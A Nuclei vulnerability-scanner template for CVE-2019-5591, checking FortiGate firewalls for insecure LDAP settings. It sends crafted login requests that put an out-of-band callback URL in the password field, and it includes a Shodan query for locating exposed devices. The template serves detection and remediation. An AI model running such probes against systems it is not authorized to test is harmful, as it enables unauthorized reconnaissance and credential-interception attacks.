id: CVE-2019-5591

info:
  name: FortiGate - Insecure LDAP Configuration Detection
  author: ayewo
  severity: medium
  description: |
    This template connects to the FortiGate web interface and attempts authentication to detect insecure LDAP configurations by checking for missing security setting (ca-cert, secure ldaps, or server-identity-check enable); lacking any of these leaves LDAP communications vulnerable to man-in-the-middle or credential interception attacks, and an LDAP server must be on the same subnet as the FortiGate for an attacker to trigger an OAST callback with stolen credentials.
  impact: |
    Successful exploitation allows adjacent network attackers to intercept LDAP credentials via MITM, a vulnerability actively exploited by threat actors and ransomware campaigns.
  remediation: |
    To secure LDAP, set ca-cert <ldap-server-certificate>, set secure ldaps, and set server-identity-check enable.
  reference:
    - https://github.com/ayewo/fortios-ldap-mitm-poc-CVE-2019-5591
    - https://www.fortiguard.com/psirt/FG-IR-19-037
    - https://www.tenable.com/blog/frequently-asked-questions-about-iranian-cyber-operations
    - https://www.hhs.gov/sites/default/files/iranian-threat-actors-and-healthcare.pdf
    - https://cert-in.org.in/PDF/RANSOMWARE_Report_2022.pdf
    - https://www.ic3.gov/media/news/2021/210527.pdf
    - https://nvd.nist.gov/vuln/detail/CVE-2019-5591
  classification:
    cvss-metrics: CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 6.5
    cve-id: CVE-2019-5591
    cpe: cpe:2.3:o:fortinet:fortios:*:*:*:*:*:*:*:*
  metadata:
    max-request: 2
    vendor: fortinet
    product: fortigate
    shodan-query: 'cpe:"cpe:2.3:o:fortinet:fortios"'
    tags: fortinet,fortigate,fortios,ldap,mitm,misconfig,insecure,kev,oast,cve,cve2019

variables:
  username: "{{rand_text_alpha(10)}}"
  password: "{{rand_text_alphanumeric(12)}}"

http:
  - raw:
      - |
        GET /login HTTP/1.1
        Host: {{Hostname}}

      - |
        POST /logincheck HTTP/1.1
        Host: {{Hostname}}
        Content-Type: text/plain;charset=UTF-8

        ajax=1&username={{username}}&secretkey={{interactsh-url}}

    matchers-condition: and
    matchers:
      - type: word
        part: body_1
        words:
          - 'name="username"'
          - 'name="secretkey"'
        condition: and

      - type: status
        status:
          - 200

      - type: dsl
        dsl:
          - contains(body_2, "0")
          - contains(body_2, "1")
          - contains(body_2, "2")
        condition: or

      - type: word
        part: body_2
        words:
          - "ajax=1&username="
        condition: or
        negative: true

      - type: word
        part: interactsh_protocol
        words:
          - "dns"
          - "http"
